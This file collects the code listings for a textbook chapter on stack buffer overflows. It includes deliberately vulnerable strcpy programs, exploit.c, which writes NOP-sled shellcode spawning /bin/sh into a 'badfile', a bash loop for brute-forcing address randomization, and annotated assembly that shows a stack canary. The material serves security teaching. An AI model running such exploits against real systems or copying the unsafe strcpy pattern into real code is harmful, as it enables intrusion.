/******************************
 * Code in Chapter 4 
 ******************************/


/**********************************************
 * Code on Pages 58-59 (Section 4.1)
 **********************************************/ 
int x = 100;
int main()
{
	// data stored on stack
	int   a=2;
	float b=2.5;
	static int y;
	
	// allocate memory on heap
	int *ptr = (int *) malloc(2*sizeof(int));
	
	// values 5 and 6 stored on heap
	ptr[0]=5;
	ptr[1]=6;
	
	// deallocate memory on heap	
	free(ptr);
	
	return 1;
}




/**********************************************
 * Code on Page 63 (Section 4.3.2)
 **********************************************/ 
#include <string.h>

void foo(char *str)
{
    char buffer[12];

    /* The following statement will result in buffer overflow */ 
    strcpy(buffer, str);
}

int main()
{
    char *str = "This is definitely longer than 12";    
    foo(str);

    return 1;
}



/**********************************************
 * Listing 4.1: The vulnerable program stack.c (Page 65) 
 **********************************************/ 
/* stack.c */
/* This program has a buffer overflow vulnerability. */
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int foo(char *str)
{
    char buffer[100];

    /* The following statement has a buffer overflow problem */ 
    strcpy(buffer, str);

    return 1;
}

int main(int argc, char **argv)
{
    char str[400];
    FILE *badfile;

    badfile = fopen("badfile", "r");
    fread(str, sizeof(char), 300, badfile);
    foo(str);

    printf("Returned Properly\n");
    return 1;
}



/**********************************************
 * Listing 4.2: exploit.c (Pages 71-72)
 **********************************************/ 
/* exploit.c  */

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
char shellcode[]=
    "\x31\xc0"             /* xorl    %eax,%eax     */
    "\x50"                 /* pushl   %eax          */
    "\x68""//sh"           /* pushl   $0x68732f2f   */
    "\x68""/bin"           /* pushl   $0x6e69622f   */
    "\x89\xe3"             /* movl    %esp,%ebx     */
    "\x50"                 /* pushl   %eax          */
    "\x53"                 /* pushl   %ebx          */
    "\x89\xe1"             /* movl    %esp,%ecx     */
    "\x99"                 /* cdq                   */
    "\xb0\x0b"             /* movb    $0x0b,%al     */
    "\xcd\x80"             /* int     $0x80         */
;

void main(int argc, char **argv)
{
  char buffer[200];
  FILE *badfile;

  /* A. Initialize buffer with 0x90 (NOP instruction) */
  memset(&buffer, 0x90, 200);

  /* B. Fill the return address field with a candidate 
        entry point of the malicious code */
  *((long *) (buffer + 112)) = 0xbffff188 + 0x80;
	
  // C. Place the shellcode towards the end of buffer
  memcpy(buffer + sizeof(buffer) - sizeof(shellcode), shellcode, 
         sizeof(shellcode));

  /* Save the contents to the file "badfile" */
  badfile = fopen("./badfile", "w");
  fwrite(buffer, 200, 1, badfile);
  fclose(badfile);
}




/**********************************************
 * Code on Page 81: Defeating randomization (Section 4.8.2)
 **********************************************/ 
#!/bin/bash

SECONDS=0
value=0

while [ 1 ]
  do
  value=$(( $value + 1 ))
  duration=$SECONDS
  min=$(($duration / 60))
  sec=$(($duration % 60))
  echo "$min minutes and $sec seconds elapsed."
  echo "The program has been running $value times so far."
  ./stack
done





/**********************************************
 * Code on Page 85 (Section 4.9.3)
 **********************************************/ 
#include <string.h>
#include <stdio.h>
#include <stdlib.h>

void foo(char *str)
{
    char buffer[12];

    /* Buffer Overflow Vulnerability */    
    strcpy(buffer, str);
}

int main(int argc, char *argv[]){

    foo(argv[1]);

    printf("Returned Properly \n\n");
    return 0;
}
\end{lstlisting}




/**********************************************
 * Assembly code on Page 85 (Section 4.9.3)
 **********************************************/ 
foo:
.LFB0:
    .cfi_startproc
    pushl    %ebp
    .cfi_def_cfa_offset 8
    .cfi_offset 5, -8
    movl    %esp, %ebp
    .cfi_def_cfa_register 5
    subl    $56, %esp
    movl    8(%ebp), %eax
    movl    %eax, -28(%ebp)
    // Canary Set Start
    movl \%gs:20, \%eax
    movl \%eax, -12(\%ebp)
    xorl \%eax, \%eax
    // Canary Set End
    movl    -28(%ebp), %eax
    movl    %eax, 4(%esp)
    leal    -24(%ebp), %eax
    movl    %eax, (%esp)
    call    strcpy
    // Canary Check Start
    movl -12(\%ebp), \%eax
    xorl \%gs:20, \%eax
    je .L2
    call __stack_chk_fail
    // Canary Check End
.L2:
    leave
    .cfi_restore 5
    .cfi_def_cfa 4, 4
    ret
    .cfi_endproc

